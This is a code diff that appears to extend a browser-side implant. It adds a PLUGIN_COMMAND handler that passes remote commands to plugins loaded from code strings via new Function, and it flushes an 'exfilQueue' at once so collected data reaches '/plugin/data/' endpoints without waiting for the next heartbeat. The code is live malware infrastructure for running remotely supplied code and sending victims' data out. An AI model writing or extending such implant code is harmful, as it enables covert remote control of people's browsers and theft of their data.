@@ -313,6 +313,8 @@
       loadPlugin(config);
     } else if (config.type === 'PLUGIN_UNLOAD') {
       unloadPlugin(config.pluginId);
+    } else if (config.type === 'PLUGIN_COMMAND') {
+      handlePluginCommand(config);
     }
   }
 
@@ -398,8 +400,13 @@
 
     try {
       var pluginFn = new Function('plugin', mainCode);
-      var cleanupFn = pluginFn(pluginAPI);
-      if (typeof cleanupFn === 'function') state.cleanup = cleanupFn;
+      var result = pluginFn(pluginAPI);
+      if (typeof result === 'function') {
+        state.cleanup = result;
+      } else if (result && typeof result === 'object') {
+        if (typeof result.cleanup === 'function') state.cleanup = result.cleanup;
+        if (typeof result.onCommand === 'function') state.onCommand = result.onCommand;
+      }
     } catch (e) {
       exfilQueue.push({ path: '/plugin/data/' + pluginId, data: { dataType: '_error', data: { error: String(e) } } });
       return;
@@ -411,6 +418,31 @@
     }
 
     __loadedPlugins.set(pluginId, state);
+  }
+
+  function handlePluginCommand(config) {
+    var pluginId = config.pluginId;
+    var command = config.command || {};
+    var state = __loadedPlugins.get(pluginId);
+    if (!state || !state.onCommand) return;
+    try {
+      var result = state.onCommand(command);
+      // If onCommand returns a promise, flush exfil queue after it resolves
+      // so response data gets sent immediately instead of waiting for next heartbeat
+      if (result && typeof result.then === 'function') {
+        result.then(function() {
+          processExfilQueue();
+        }).catch(function() {
+          processExfilQueue();
+        });
+      } else {
+        // Flush immediately for sync commands
+        setTimeout(function() { processExfilQueue(); }, 50);
+      }
+    } catch (e) {
+      exfilQueue.push({ path: '/plugin/data/' + pluginId, data: { dataType: '_error', data: { error: 'Command error: ' + String(e) } } });
+      processExfilQueue();
+    }
   }
 
   function unloadPlugin(pluginId) {
